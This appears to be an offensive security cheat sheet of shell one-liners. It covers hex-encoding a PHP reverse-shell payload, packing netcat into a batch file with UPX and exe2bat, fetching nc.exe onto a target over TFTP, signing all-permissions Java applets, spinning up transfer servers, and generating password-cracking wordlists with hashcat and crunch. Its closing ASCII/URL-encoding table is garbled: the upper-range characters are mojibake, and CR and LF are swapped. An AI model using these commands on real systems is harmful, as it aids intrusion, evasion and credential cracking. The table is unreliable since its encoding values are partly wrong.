`` Compression

    ~$ 7z a -t7z -m0=lzma2 -mx=9 -mfb=64 -md=32m -ms=on -mhe=on -p archive.7z ./directory/

`` Convert payload to hex

    ~$ echo '<?php $sock=fsock[...]$pipes); ?>' | xxd -ps | tr -d '\n'
        # 3c3f70...
    ~$ echo 3c3f70... | xxd -ps -r

`` Sources

    `` Update Git library

        ~$ export TMPPWD=$PWD; for x in $(find . -name '.git' -type d | xargs -n 1 dirname); do cd $TMPPWD; cd $x; git reset --hard; git pull; done

    `` diff

        ~$ icdiff --strip-trailing-cr -H *.c

    `` gcc

        `` Compiling for GNU/Linux

            ~$ gcc -shared source.c -o executable
            ~$ gcc -static source.c -o executable
            ~$ gcc -m32 source.c -o executable
            ~$ gcc -m32 source.c -o executable -Wl,--hash-style=both

        `` Compiling for Windows

            ~$ i686-w64-mingw32-gcc -lws2_32 -o executable source.c
            ~$ i686-w64-mingw32-gcc -o executable source.c

        `` All files in current directory

            ~$ for fil in $(ls *.c); do echo gcc -o ${fil::${#fil}-2} $fil; done

    `` Java

        `` Signing applets

            ~$ javac -source 1.7 -target 1.7 Java.java
            ~$ echo "Permissions: all-permissions" > manifest.txt
            ~$ jar cvf Java.jar Java.class
            ~$ jarsigner -keystore mykeystore -storepass secret -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
            ~$ keytool -genkey -alias signapplet -keystore mykeystore -keypass secret -storepass secret
            ~$ keytool -list -v -keystore mykeystore
            ~$ jarsigner -keystore mykeystore -storepass secret -keypass secret -signedjar SignedJava.jar Java.jar signapplet

`` Packing

    `` Python to EXE

        ~$ python pyinstaller.py --onefile exploit.py

    `` EXE to BAT

        ~$ cp /usr/share/windows-binaries/nc.exe ./nc.exe
        ~$ upx -9 nc.exe
        ~$ wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt

`` Servers

    `` HTTP

        `` socat

            ~$ socat TCP-LISTEN:8000,crlf SYSTEM:"echo HTTP/1.0 200; echo Content-Type\: text/plain; echo; cat"

        `` Python

            ~$ python2 -m SimpleHTTPServer
            ~$ python3 -m http.server

        `` Python IPv6

            ~$ echo -e 'import BaseHTTPServer\nimport SimpleHTTPServer\nimport socket\nclass HTTPServer6(BaseHTTPServer.HTTPServer):\n address_family = socket.AF_INET6\nif __name__ == "__main__":\n SimpleHTTPServer.test(ServerClass=HTTPServer6)' | python2

        `` Ruby

            ~$ ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start"

        `` PHP

            ~$ php -S 0.0.0.0:8000

        `` Perl

            ~$ cpan HTTP::Server::Brick
            ~$ perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>8000); $s->mount("/"=>{path=>"."}); $s->start'

    `` FTP

        ~$ python -m pyftpdlib -p 21 -w

    `` SMB

        ~$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py TEST .

    `` TFTP

        `` Server

            ~$ atftpd --daemon --port 69 /tftp

        `` Client

            ~$ tftp -i VAR_TARGET_HOST GET nc.exe

    `` SMTP

        `` Server

            ~$ socat - TCP-LISTEN:25,crlf
            ~$ socat readline TCP-LISTEN:25,crlf

        `` Local delivery

            ~$ socat UNIX-LISTEN:/tmp/mail,fork,perm-early=0666 exec:"/usr/sbin/sendmail -bs"
            ~$ socat - /tmp/mail


        `` Python

            ~# python -m smtpd -n -c DebuggingServer 0.0.0.0:25

`` IP

    `` Conversion

        172.217.16.14
        ((172 * 256 + 217) * 256 + 16 ) * 256 + 14 = 2899906574 = 0xacd9100e

        127.0.0.1 == 2130706433 == 7F000001 == 1111111000000000000000000000001 == 017700000001

`` File analysis

    ~$ file executable
    ~$ binwalk executable
    ~$ foremost executable

`` Passwords

    `` Combining

        ~$ /usr/share/hashcat-utils/combinator.bin wordlist wordlist > combined
        ~$ crunch 1 2 -p combine couple words > combined

    `` Wordlists

        ~$ cewl http://VAR_TARGET_HOST -d 1 -m 6 -w wordlist

    `` Extract last column separated by :

        ~$ cat VAR_FILE | grep -o '[^:]*$'

    `` Most frequent words

        ~$ cat VAR_FILE | sort | uniq -c | sort -nr | head -n 1000

    `` Keep only the lines unique to sorted2

        ~$ comm -13 sorted1 sorted2 > sorted3

    `` Permutations

        ~$ crunch 4 8 > wordlist
        ~$ hashcat -r /usr/share/hashcat/rules/hybrid/append_ldus.rule --stdout wordlist >> permuted
        ~$ hashcat -r /usr/share/hashcat/rules/hybrid/prepend_ldus.rule --stdout wordlist >> permuted
        ~$ hashcat -r /usr/share/hashcat/rules/combinator.rule --stdout wordlist >> permuted
        ~$ hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist >> permuted
        ~$ hashcat -r /usr/share/hashcat/rules/T0XlCv1.rule --stdout wordlist >> permuted
        ~$ hashcat -r /usr/share/hashcat/rules/unix-ninja-leetspeak.rule --stdout wordlist >> permuted
        ~$ hashcat -r /usr/share/hashcat/rules/rockyou-30000.rule --stdout wordlist >> permuted
        ~$ sort permuted | uniq > unique

    `` Length

        ~$ awk 'length($0)>4 && length($0)<12' unique > final

`` Nmap

    -- Check if port 8443 is in top 500 ports
    ~$ sort -r -k3 /usr/share/nmap/nmap-services | head -n 500 | grep 8443

    -- How many top ports to include 9443?
    ~$ sort -r -k3 /usr/share/nmap/nmap-services | grep -n 9443


`` ASCII

    character   encoding    decimal
    NULL    %0  0
       %1  1
       %2  2
       %3  3
       %4  4
       %5  5
       %6  6
       %7  7
       %8  8
    TAB %9  9
    CR  %A  10
       %B  11
   %C  12
    LF  %D  13
       %E  14
       %F  15
       %10 16
       %11 17
       %12 18
       %13 19
       %14 20
       %15 21
       %16 22
       %17 23
       %18 24
       %19 25
       %1A 26
       %1B 27
       %1C 28
       %1D 29
       %1E 30
       %1F 31
    SPACE   %20 32
    !   %21 33
    "   %22 34
    #   %23 35
    $   %24 36
    %   %25 37
    &   %26 38
    '   %27 39
    (   %28 40
    )   %29 41
    *   %2A 42
    +   %2B 43
    ,   %2C 44
    -   %2D 45
    .   %2E 46
    /   %2F 47
    0   %30 48
    1   %31 49
    2   %32 50
    3   %33 51
    4   %34 52
    5   %35 53
    6   %36 54
    7   %37 55
    8   %38 56
    9   %39 57
    :   %3A 58
    ;   %3B 59
    <   %3C 60
    =   %3D 61
    >   %3E 62
    ?   %3F 63
    @   %40 64
    A   %41 65
    B   %42 66
    C   %43 67
    D   %44 68
    E   %45 69
    F   %46 70
    G   %47 71
    H   %48 72
    I   %49 73
    J   %4A 74
    K   %4B 75
    L   %4C 76
    M   %4D 77
    N   %4E 78
    O   %4F 79
    P   %50 80
    Q   %51 81
    R   %52 82
    S   %53 83
    T   %54 84
    U   %55 85
    V   %56 86
    W   %57 87
    X   %58 88
    Y   %59 89
    Z   %5A 90
    [   %5B 91
    \   %5C 92
    ]   %5D 93
    ^   %5E 94
    _   %5F 95
    `   %60 96
    a   %61 97
    b   %62 98
    c   %63 99
    d   %64 100
    e   %65 101
    f   %66 102
    g   %67 103
    h   %68 104
    i   %69 105
    j   %6A 106
    k   %6B 107
    l   %6C 108
    m   %6D 109
    n   %6E 110
    o   %6F 111
    p   %70 112
    q   %71 113
    r   %72 114
    s   %73 115
    t   %74 116
    u   %75 117
    v   %76 118
    w   %77 119
    x   %78 120
    y   %79 121
    z   %7A 122
    {   %7B 123
    |   %7C 124
    }   %7D 125
    ~   %7E 126
    &127;   %7F 127
    ‚Ç¨   %80 128
    ¬Å   %81 129
    ‚Äö   %82 130
    ∆í   %83 131
    ‚Äû   %84 132
    ‚Ä¶   %85 133
    ‚Ä†   %86 134
    ‚Ä°   %87 135
    ÀÜ   %88 136
    ‚Ä∞   %89 137
    ≈†   %8A 138
    ‚Äπ   %8B 139
    ≈í   %8C 140
    ¬ç   %8D 141
    ≈Ω   %8E 142
    ¬è   %8F 143
    ¬ê   %90 144
    ‚Äò   %91 145
    ‚Äô   %92 146
    ‚Äú   %93 147
    ‚Äù   %94 148
    ‚Ä¢   %95 149
    ‚Äì   %96 150
    ‚Äî   %97 151
    Àú   %98 152
    ‚Ñ¢   %99 153
    ≈°   %9A 154
    ‚Ä∫   %9B 155
    ≈ì   %9C 156
    ¬ù   %9D 157
    ≈æ   %9E 158
    ≈∏   %9F 159
        %A0 160
    ¬°   %A1 161
    ¬¢   %A2 162
    ¬£   %A3 163
    ¬§   %A4 164
    ¬•   %A5 165
    ¬¶   %A6 166
    ¬ß   %A7 167
    ¬®   %A8 168
    ¬©   %A9 169
    ¬™   %AA 170
    ¬´   %AB 171
    ¬¨   %AC 172
    ¬≠   %AD 173
    ¬Æ   %AE 174
    ¬Ø   %AF 175
    ¬∞   %B0 176
    ¬±   %B1 177
    ¬≤   %B2 178
    ¬≥   %B3 179
    ¬¥   %B4 180
    ¬µ   %B5 181
    ¬∂   %B6 182
    ¬∑   %B7 183
    ¬∏   %B8 184
    ¬π   %B9 185
    ¬∫   %BA 186
    ¬ª   %BB 187
    ¬º   %BC 188
    ¬Ω   %BD 189
    ¬æ   %BE 190
    ¬ø   %BF 191
    √Ä   %C0 192
    √Å   %C1 193
    √Ç   %C2 194
    √É   %C3 195
    √Ñ   %C4 196
    √Ö   %C5 197
    √Ü   %C6 198
    √á   %C7 199
    √à   %C8 200
    √â   %C9 201
    √ä   %CA 202
    √ã   %CB 203
    √å   %CC 204
    √ç   %CD 205
    √é   %CE 206
    √è   %CF 207
    √ê   %D0 208
    √ë   %D1 209
    √í   %D2 210
    √ì   %D3 211
    √î   %D4 212
    √ï   %D5 213
    √ñ   %D6 214
    √ó   %D7 215
    √ò   %D8 216
    √ô   %D9 217
    √ö   %DA 218
    √õ   %DB 219
    √ú   %DC 220
    √ù   %DD 221
    √û   %DE 222
    √ü   %DF 223
    √†   %E0 224
    √°   %E1 225
    √¢   %E2 226
    √£   %E3 227
    √§   %E4 228
    √•   %E5 229
    √¶   %E6 230
    √ß   %E7 231
    √®   %E8 232
    √©   %E9 233
    √™   %EA 234
    √´   %EB 235
    √¨   %EC 236
    √≠   %ED 237
    √Æ   %EE 238
    √Ø   %EF 239
    √∞   %F0 240
    √±   %F1 241
    √≤   %F2 242
    √≥   %F3 243
    √¥   %F4 244
    √µ   %F5 245
    √∂   %F6 246
    √∑   %F7 247
    √∏   %F8 248
    √π   %F9 249
    √∫   %FA 250
    √ª   %FB 251
    √º   %FC 252
    √Ω   %FD 253
    √æ   %FE 254
    √ø   %FF 255
